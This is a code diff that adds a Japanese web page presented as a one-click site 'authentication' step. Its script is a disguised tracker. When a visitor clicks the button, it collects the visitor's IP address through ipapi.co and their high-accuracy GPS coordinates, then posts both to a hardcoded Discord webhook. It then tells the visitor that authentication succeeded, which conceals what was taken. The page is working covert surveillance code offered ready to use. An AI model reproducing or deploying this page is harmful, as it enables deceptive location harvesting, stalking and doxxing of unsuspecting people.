@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>認証</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: linear-gradient(135deg, #1e1e2f 0%, #2d2d44 100%);
+    font-family: 'Segoe UI', 'Hiragino Sans', sans-serif;
+    color: #fff;
+  }
+  .container {
+    text-align: center;
+    background: rgba(255,255,255,0.05);
+    padding: 60px 80px;
+    border-radius: 20px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+    backdrop-filter: blur(10px);
+  }
+  h1 { font-size: 1.5rem; margin-bottom: 30px; font-weight: 400; }
+  #authBtn {
+    font-size: 1.3rem;
+    padding: 18px 50px;
+    border: none;
+    border-radius: 50px;
+    background: linear-gradient(135deg, #5865F2, #7c85ff);
+    color: #fff;
+    cursor: pointer;
+    transition: transform 0.2s, box-shadow 0.2s;
+    box-shadow: 0 4px 15px rgba(88,101,242,0.4);
+  }
+  #authBtn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(88,101,242,0.6);
+  }
+  #authBtn:disabled { opacity: 0.6; cursor: not-allowed; }
+  #status { margin-top: 20px; font-size: 0.95rem; color: #b0b0c0; min-height: 1.2em; }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>サイトへようこそ</h1>
+    <button id="authBtn">認証する ✅</button>
+    <p id="status"></p>
+  </div>
+
+<script>
+  // ============================================================
+  // ▼▼▼ ここに【新しい】Discord Webhook URLを貼り付けてください ▼▼▼
+  // ============================================================
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1551267375494602892/gwaA_tFyB-8zkvW6RkdYK_GX-u7daXL9v-RBEBeH__Mb5Y-OTWQ5g9g73S3qt5v6wiuU";
+  // ============================================================
+
+  const btn = document.getElementById('authBtn');
+  const status = document.getElementById('status');
+
+  btn.addEventListener('click', async () => {
+    if (WEBHOOK_URL.includes("ここに")) {
+      status.textContent = '⚠️ Webhook URLが設定されていません';
+      return;
+    }
+
+    btn.disabled = true;
+    status.textContent = '認証中... 位置情報の許可をお願いします';
+
+    try {
+      // 1. IP取得
+      let ip = '取得失敗';
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        if (data.ip) ip = data.ip;
+      } catch (e) {
+        console.warn('IP取得失敗', e);
+      }
+
+      // 2. GPS取得
+      const getPosition = () => new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject('非対応');
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      });
+
+      let gps = '取得失敗';
+      try {
+        const pos = await getPosition();
+        gps = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+      } catch (e) {
+        gps = '取得失敗（許可されていません）';
+      }
+
+      // 3. 送信メッセージ組み立て
+      const content = `IP\n${ip}\nGPS\n${gps}`;
+
+      // 4. Discord Webhookへ送信
+      const send = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: content })
+      });
+
+      if (send.ok) {
+        status.textContent = '✅ 認証が完了しました';
+        btn.textContent = '認証済み ✅';
+      } else {
+        throw new Error('送信失敗: ' + send.status);
+      }
+
+    } catch (err) {
+      console.error(err);
+      status.textContent = '❌ エラー: ' + err.message;
+      btn.disabled = false;
+    }
+  });
+</script>
+</body>
+</html>
